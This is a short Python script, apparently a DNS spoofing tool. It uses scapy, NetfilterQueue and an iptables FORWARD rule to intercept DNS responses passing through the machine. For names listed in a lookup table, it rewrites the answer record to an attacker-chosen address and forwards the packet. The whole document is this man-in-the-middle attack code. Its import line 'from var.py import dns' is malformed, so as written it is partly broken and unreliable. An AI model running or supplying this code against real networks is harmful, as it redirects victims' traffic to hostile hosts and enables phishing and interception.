from scapy.all import *
from scapy.layers.inet import IP
from netfilterqueue import NetfilterQueue
from var.py import dns
import os

os.system("sudo sh iptables.sh")

def processP(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        print("PROCESSING : ", scapy_packet.summary())

        try:
            scapy_packet = modify(scapy_packet)
        except IndexError:
            pass
        print("FORWARDING! > ", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify(packet):
    qname = packet[DNSQR].qname
    if qname not in dns:
        print("NO MODIFICATION > ", qname)
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns[qname])

    packet[DNS].ancount = 1

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet
Q = 0
os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(Q))

queue = NetfilterQueue()

try:
    queue.bind(Q, processP)
    queue.run()
except KeyboardInterrupt:
    print("Cleaning queue..")
    os.system("sudo sh ipflush.sh")
